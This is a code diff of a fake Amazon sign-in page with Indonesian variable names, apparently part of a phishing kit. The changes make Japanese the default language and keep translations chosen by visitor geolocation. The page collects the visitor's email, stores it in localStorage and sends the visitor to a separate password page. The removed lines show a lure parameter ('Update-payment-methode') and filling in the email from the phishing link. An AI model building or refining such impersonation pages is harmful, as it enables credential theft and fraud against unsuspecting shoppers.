@@ -1,30 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon — Sign In</title>
+    <title>Amazon — ログインまたはアカウント作成</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', 'Noto Sans JP', Arial, sans-serif; }
+        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
         .logo { margin: 10px 0 25px; text-align: center; }
         .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 348px; padding: 20px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
-        h1 { font-size: 28px; font-weight: 400; margin-bottom: 15px; }
+        .kotak { width: 100%; max-width: 348px; padding: 25px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
+        h1 { font-size: 28px; font-weight: 400; margin-bottom: 12px; }
+        .sub-judul { font-size: 14px; color: #555; margin-bottom: 18px; }
         label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
-        .input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 32px; margin-bottom: 4px; outline: none; transition: border-color 0.1s; }
+        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 36px; margin-bottom: 4px; outline: none; transition: border-color 0.1s; }
         .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
         .input.salah { border-color: #d00; border-width: 2px; }
-        .pesan-merah { color: #d00; font-size: 13px; margin: 0 0 15px; display: none; align-items: center; gap: 6px; }
-        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center: width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
-        .tombol { width: 100%; padding: 6px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 40px; cursor: pointer; margin-bottom: 20px; }
+        .pesan-merah { color: #d00; font-size: 13px; margin: 0 0 12px; display: none; align-items: center; gap: 6px; }
+        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .tombol { width: 100%; padding: 6px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 40px; cursor: pointer; margin: 10px 0 20px; }
         .tombol:hover { background: #f7ca00; }
         .syarat { font-size: 12px; line-height: 1.5; margin-bottom: 25px; }
         .syarat a { color: #0066c0; text-decoration: none; }
-        .bantuan { font-size: 13px; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid #e7e7e7; }
+        .garis-pemisah { border-top: 1px solid #e7e7e7; margin: 20px 0; }
+        .bantuan { font-size: 13px; margin-bottom: 25px; }
         .bantuan a { color: #0066c0; text-decoration: none; }
         .bisnis { font-size: 13px; }
-        .bisnis strong { display: block; margin-bottom: 5px; }
         .bisnis a { color: #0066c0; text-decoration: none; }
         .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; max-width: 100%; text-align: center; font-size: 11px; color: #555; }
         .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
@@ -33,47 +34,53 @@
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1 id="judul">Sign in or create account</h1>
-        <label id="labelEmail" for="email">Enter mobile number or email</label>
+        <h1 id="judul">ログインまたはアカウント作成</h1>
+        <p class="sub-judul" id="subJudul">携帯電話番号またはメールアドレスを入力</p>
+        
+        <label id="labelEmail" for="email">メールアドレスまたは携帯電話番号</label>
         <input type="text" id="email" class="input">
+        
         <p id="pesanKosong" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            <span id="teksKosong">Enter your mobile number or email</span>
+            <span id="teksKosong">メールアドレスまたは携帯電話番号を入力してください</span>
         </p>
-        <p id="pesanLink" class="pesan-merah">
+        <p id="pesanSalah" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            <span id="teksLink">Invalid access link</span>
+            <span id="teksSalah">無効なアクセスリンクです</span>
         </p>
+        
         <button type="button" id="lanjut" class="tombol">
-            <span id="teksLanjut">Continue</span>
+            <span id="teksTombol">続行</span>
         </button>
-        <p class="syarat" id="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
-        <p class="bantuan"><a href="#" id="bantuan">Need help?</a></p>
-        <div class="bisnis" id="bagianBisnis">
-            <strong id="bisnisJudul">Buying for work?</strong>
-            <a href="#" id="bisnisLink">Create a free business account</a>
-        </div>
+        
+        <p class="syarat" id="syarat">続行することで、Amazonの<a href="#">利用規約</a>および<a href="#">プライバシー通知</a>に同意するものとします。</p>
+        
+        <div class="garis-pemisah"></div>
+        
+        <p class="bantuan" id="bantuanTeks">お困りですか？<br><a href="#">ヘルプを参照する</a></p>
+        
+        <p class="bisnis" id="bisnisTeks">業務用に購入ですか？<br><a href="#">無料の法人アカウントを作成</a></p>
     </div>
     <div class="bawah">
-        <p><a href="#" id="syaratLink1">Conditions of Use</a> <a href="#" id="syaratLink2">Privacy Notice</a> <a href="#" id="bantuanLink">Help</a></p>
-        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <p><a href="#" id="syaratLink1">利用規約</a> <a href="#" id="syaratLink2">プライバシー通知</a> <a href="#" id="bantuanLink">ヘルプ</a></p>
+        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. またはその関連会社</p>
     </div>
 
 <script>
 // ==============================================
-// DAFTAR TERJEMAHAN LENGKAP
+// DAFTAR TERJEMAHAN
 // ==============================================
 const terjemahan = {
     EN: {
         judul: 'Sign in or create account',
-        labelEmail: 'Enter mobile number or email',
-        teksKosong: 'Enter your mobile number or email',
-        teksLink: 'Invalid access link',
-        teksLanjut: 'Continue',
+        subJudul: 'Enter your email or mobile phone number',
+        labelEmail: 'Email or mobile phone number',
+        teksKosong: 'Enter your email or mobile phone number',
+        teksSalah: 'Invalid access link',
+        teksTombol: 'Continue',
         syarat: 'By continuing, you agree to Amazon\'s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.',
-        bantuan: 'Need help?',
-        bisnisJudul: 'Buying for work?',
-        bisnisLink: 'Create a free business account',
+        bantuanTeks: 'Need help?<br><a href="#">Learn more</a>',
+        bisnisTeks: 'Buying for work?<br><a href="#">Create a free business account</a>',
         syaratLink1: 'Conditions of Use',
         syaratLink2: 'Privacy Notice',
         bantuanLink: 'Help',
@@ -81,29 +88,29 @@ const terjemahan = {
     },
     JA: {
         judul: 'ログインまたはアカウント作成',
-        labelEmail: '携帯電話番号またはメールアドレスを入力',
-        teksKosong: '携帯電話番号またはメールアドレスを入力してください',
-        teksLink: '無効なアクセスリンクです',
-        teksLanjut: '続行',
+        subJudul: '携帯電話番号またはメールアドレスを入力',
+        labelEmail: 'メールアドレスまたは携帯電話番号',
+        teksKosong: 'メールアドレスまたは携帯電話番号を入力してください',
+        teksSalah: '無効なアクセスリンクです',
+        teksTombol: '続行',
         syarat: '続行することで、Amazonの<a href="#">利用規約</a>および<a href="#">プライバシー通知</a>に同意するものとします。',
-        bantuan: 'お困りですか？',
-        bisnisJudul: '業務用に購入ですか？',
-        bisnisLink: '無料の法人アカウントを作成',
+        bantuanTeks: 'お困りですか？<br><a href="#">ヘルプを参照する</a>',
+        bisnisTeks: '業務用に購入ですか？<br><a href="#">無料の法人アカウントを作成</a>',
         syaratLink1: '利用規約',
         syaratLink2: 'プライバシー通知',
         bantuanLink: 'ヘルプ',
         hakCiptaan: '© 1996-2026, Amazon.com, Inc. またはその関連会社'
     },
     ZH: {
-        judul: '登录或创建账户',
-        labelEmail: '输入手机号码或电子邮箱',
-        teksKosong: '请输入您的手机号码或电子邮箱',
-        teksLink: '访问链接无效',
-        teksLanjut: '继续',
+        judul: '登录或注册新账户',
+        subJudul: '输入电子邮箱或手机号码',
+        labelEmail: '电子邮箱或手机号码',
+        teksKosong: '请输入电子邮箱或手机号码',
+        teksSalah: '访问链接无效',
+        teksTombol: '继续',
         syarat: '继续即表示您同意亚马逊的<a href="#">使用条件</a>和<a href="#">隐私声明</a>。',
-        bantuan: '需要帮助？',
-        bisnisJudul: '为工作采购？',
-        bisnisLink: '创建免费商务账户',
+        bantuanTeks: '需要帮助？<br><a href="#">了解更多</a>',
+        bisnisTeks: '企业采购？<br><a href="#">免费创建企业账户</a>',
         syaratLink1: '使用条件',
         syaratLink2: '隐私声明',
         bantuanLink: '帮助',
@@ -111,29 +118,29 @@ const terjemahan = {
     },
     TH: {
         judul: 'เข้าสู่ระบบหรือสร้างบัญชี',
-        labelEmail: 'ป้อนหมายเลขโทรศัพท์มือถือหรืออีเมล',
-        teksKosong: 'กรุณาป้อนหมายเลขโทรศัพท์มือถือหรืออีเมลของคุณ',
-        teksLink: 'ลิงก์เข้าถึงไม่ถูกต้อง',
-        teksLanjut: 'ดำเนินการต่อ',
+        subJudul: 'ป้อนอีเมลหรือหมายเลขโทรศัพท์มือถือ',
+        labelEmail: 'อีเมลหรือหมายเลขโทรศัพท์มือถือ',
+        teksKosong: 'กรุณาป้อนอีเมลหรือหมายเลขโทรศัพท์',
+        teksSalah: 'ลิงก์เข้าถึงไม่ถูกต้อง',
+        teksTombol: 'ดำเนินการต่อ',
         syarat: 'ดำเนินการต่อแสดงว่าคุณยอมรับ<a href="#">เงื่อนไขการใช้งาน</a>และ<a href="#">ประกาศความเป็นส่วนตัว</a>ของ Amazon',
-        bantuan: 'ต้องการความช่วยเหลือหรือไม่',
-        bisnisJudul: 'ซื้อเพื่อธุรกิจหรือไม่',
-        bisnisLink: 'สร้างบัญชีธุรกิจฟรี',
+        bantuanTeks: 'ต้องการความช่วยเหลือ？<br><a href="#">เรียนรู้เพิ่มเติม</a>',
+        bisnisTeks: 'ซื้อสำหรับธุรกิจ？<br><a href="#">สร้างบัญชีธุรกิจฟรี</a>',
         syaratLink1: 'เงื่อนไขการใช้งาน',
         syaratLink2: 'ประกาศความเป็นส่วนตัว',
         bantuanLink: 'ช่วยเหลือ',
         hakCiptaan: '© 1996-2026, Amazon.com, Inc. หรือบริษัทในเครือ'
     },
     KO: {
-        judul: '로그인 또는 계정 생성',
-        labelEmail: '휴대폰 번호 또는 이메일 입력',
-        teksKosong: '휴대폰 번호 또는 이메일을 입력하세요',
-        teksLink: '유효하지 않은 접근 링크입니다',
-        teksLanjut: '계속',
+        judul: '로그인 또는 계정 만들기',
+        subJudul: '이메일 또는 휴대폰 번호를 입력하세요',
+        labelEmail: '이메일 또는 휴대폰 번호',
+        teksKosong: '이메일 또는 휴대폰 번호를 입력하세요',
+        teksSalah: '유효하지 않은 접근 링크입니다',
+        teksTombol: '계속',
         syarat: '계속하면 Amazon의 <a href="#">이용 약관</a> 및 <a href="#">개인정보 처리방침</a>에 동의하는 것으로 간주됩니다.',
-        bantuan: '도움이 필요하신가요?',
-        bisnisJudul: '업무용으로 구매하시나요?',
-        bisnisLink: '무료 비즈니스 계정 생성',
+        bantuanTeks: '도움이 필요하신가요?<br><a href="#">자세히 알아보기</a>',
+        bisnisTeks: '직장에서 사용하시나요?<br><a href="#">무료 비즈니스 계정 만들기</a>',
         syaratLink1: '이용 약관',
         syaratLink2: '개인정보 처리방침',
         bantuanLink: '도움말',
@@ -141,14 +148,14 @@ const terjemahan = {
     },
     ID: {
         judul: 'Masuk atau Buat Akun',
-        labelEmail: 'Masukkan nomor ponsel atau email',
-        teksKosong: 'Masukkan nomor ponsel atau email Anda',
-        teksLink: 'Tautan akses tidak valid',
-        teksLanjut: 'Lanjutkan',
+        subJudul: 'Masukkan email atau nomor ponsel',
+        labelEmail: 'Email atau nomor ponsel',
+        teksKosong: 'Masukkan email atau nomor ponsel Anda',
+        teksSalah: 'Tautan akses tidak valid',
+        teksTombol: 'Lanjutkan',
         syarat: 'Dengan melanjutkan, Anda menyetujui <a href="#">Syarat Penggunaan</a> dan <a href="#">Pemberitahuan Privasi</a> Amazon.',
-        bantuan: 'Butuh bantuan?',
-        bisnisJudul: 'Berbelanja untuk keperluan bisnis?',
-        bisnisLink: 'Buat akun bisnis gratis',
+        bantuanTeks: 'Butuh bantuan?<br><a href="#">Pelajari selengkapnya</a>',
+        bisnisTeks: 'Belanja untuk kantor?<br><a href="#">Buat akun bisnis gratis</a>',
         syaratLink1: 'Syarat Penggunaan',
         syaratLink2: 'Pemberitahuan Privasi',
         bantuanLink: 'Bantuan',
@@ -156,51 +163,35 @@ const terjemahan = {
     }
 };
 
-// Peta Kode Negara → Bahasa
 const negaraKeBahasa = {
-    JP: 'JA',
-    CN: 'ZH',
-    HK: 'ZH',
-    TW: 'ZH',
-    TH: 'TH',
-    KR: 'KO',
-    ID: 'ID',
-    MY: 'EN',
-    SG: 'EN',
-    US: 'EN',
-    AU: 'EN',
-    GB: 'EN',
-    CA: 'EN',
-    NZ: 'EN'
+    JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID',
+    MY: 'EN', SG: 'EN', US: 'EN', AU: 'EN', GB: 'EN', CA: 'EN', NZ: 'EN'
 };
 
 // ==============================================
-// DETEKSI NEGARA & TERAPKAN BAHASA
+// DETEKSI & TERAPKAN BAHASA
 // ==============================================
 async function terapkanBahasa() {
-    let kodeNegara = 'GB'; // Default
+    let kodeNegara = 'JP';
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        kodeNegara = data.country_code || 'GB';
-    } catch (e) {
-        console.log('Gagal deteksi lokasi, gunakan default');
-    }
+        kodeNegara = data.country_code || 'JP';
+    } catch {}
 
-    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
-    const teks = terjemahan[kodeBahasa] || terjemahan.EN;
+    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'JA';
+    const teks = terjemahan[kodeBahasa] || terjemahan.JA;
 
-    // Terapkan semua teks
     document.documentElement.lang = kodeBahasa.toLowerCase();
     document.getElementById('judul').textContent = teks.judul;
+    document.getElementById('subJudul').textContent = teks.subJudul;
     document.getElementById('labelEmail').textContent = teks.labelEmail;
     document.getElementById('teksKosong').textContent = teks.teksKosong;
-    document.getElementById('teksLink').textContent = teks.teksLink;
-    document.getElementById('teksLanjut').textContent = teks.teksLanjut;
+    document.getElementById('teksSalah').textContent = teks.teksSalah;
+    document.getElementById('teksTombol').textContent = teks.teksTombol;
     document.getElementById('syarat').innerHTML = teks.syarat;
-    document.getElementById('bantuan').textContent = teks.bantuan;
-    document.getElementById('bisnisJudul').textContent = teks.bisnisJudul;
-    document.getElementById('bisnisLink').textContent = teks.bisnisLink;
+    document.getElementById('bantuanTeks').innerHTML = teks.bantuanTeks;
+    document.getElementById('bisnisTeks').innerHTML = teks.bisnisTeks;
     document.getElementById('syaratLink1').textContent = teks.syaratLink1;
     document.getElementById('syaratLink2').textContent = teks.syaratLink2;
     document.getElementById('bantuanLink').textContent = teks.bantuanLink;
@@ -210,50 +201,35 @@ async function terapkanBahasa() {
 // ==============================================
 // FUNGSI UTAMA
 // ==============================================
-const paramNama = 'Update-payment-methode';
-const queryStr = window.location.search.substring(1);
-const validParam = queryStr.includes(paramNama);
-
-// Isi email otomatis dari link
-const cocok = queryStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
-if (cocok) document.getElementById('email').value = cocok[0];
-
-const emailInput = document.getElementById('email');
+const inputEmail = document.getElementById('email');
 const tombolLanjut = document.getElementById('lanjut');
 const pesanKosong = document.getElementById('pesanKosong');
-const pesanLink = document.getElementById('pesanLink');
+const pesanSalah = document.getElementById('pesanSalah');
 
-// Sembunyikan pesan saat mengetik
-emailInput.addEventListener('input', () => {
-    emailInput.classList.remove('salah');
+// Saat mengetik → hapus pesan merah
+inputEmail.addEventListener('input', () => {
+    inputEmail.classList.remove('salah');
     pesanKosong.style.display = 'none';
-    pesanLink.style.display = 'none';
+    pesanSalah.style.display = 'none';
 });
 
-// Klik tombol
-tombolLanjut.onclick = function() {
-    const isiEmail = emailInput.value.trim();
+// Klik tombol → cek & lanjut
+tombolLanjut.addEventListener('click', () => {
+    const email = inputEmail.value.trim();
     
-    pesanKosong.style.display = 'none';
-    pesanLink.style.display = 'none';
-    emailInput.classList.remove('salah');
-    
-    if (!validParam) {
-        pesanLink.style.display = 'flex';
-        return;
-    }
-    
-    if (!isiEmail) {
-        emailInput.classList.add('salah');
+    if (!email) {
+        inputEmail.classList.add('salah');
         pesanKosong.style.display = 'flex';
         return;
     }
     
-    localStorage.setItem('email_pengguna', isiEmail);
+    // Simpan email ke localStorage
+    localStorage.setItem('email_pengguna', email);
+    
+    // Langsung ke halaman password
     window.location.href = 'password.html';
-};
+});
 
-// Jalankan deteksi bahasa saat halaman dibuka
 terapkanBahasa();
 </script>
 </body>
